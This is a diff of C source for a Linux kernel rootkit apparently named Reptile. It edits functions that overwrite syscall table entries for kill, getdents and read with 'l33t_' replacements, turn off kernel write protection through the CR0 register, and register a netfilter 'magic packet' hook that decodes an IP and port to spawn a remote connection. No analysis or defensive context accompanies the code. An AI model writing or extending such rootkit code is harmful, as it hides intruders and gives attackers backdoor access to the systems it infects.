@@ -225,7 +225,7 @@ int atoi(char *str){
 	return result;
 }
 
-void decode_n_spawn(char *data) {
+void decode_n_spawn(const char *data) {
 	int tsize;
 	char *ip, *port, *p = NULL, *buf = NULL;  
 
@@ -261,7 +261,7 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops, struct sk_buff *so
 	struct tcphdr	_tcph;
 	struct udphdr	_udph;
 	const char *data;
-	char *_dt, token[] = TOKEN;
+	char *_dt, *token = TOKEN;
     	int tsize;
 
     	data = NULL;
@@ -589,7 +589,6 @@ static int __init reptile_init(void) {
 	sct[__NR_kill] = (unsigned long)l33t_kill;		
 	sct[__NR_getdents64] = (unsigned long)l33t_getdents64;		
 	sct[__NR_getdents] = (unsigned long)l33t_getdents;		
-	sct[__NR_read] = (unsigned long)l33t_read;		
 	write_cr0(read_cr0() | 0x10000);
 
     	magic_packet_hook_options.hook     = (void *) magic_packet_hook;
@@ -602,8 +601,12 @@ static int __init reptile_init(void) {
 #else
     	nf_register_hook(&magic_packet_hook_options);
 #endif
-    	work_queue = create_workqueue(WORKQUEUE);	
+    	work_queue = create_workqueue(HIDE);	
+	
 	exec(argv);
+	write_cr0(read_cr0() & (~0x10000));
+	sct[__NR_read] = (unsigned long)l33t_read;		
+	write_cr0(read_cr0() | 0x10000);
 
 	return 0; 
 } 
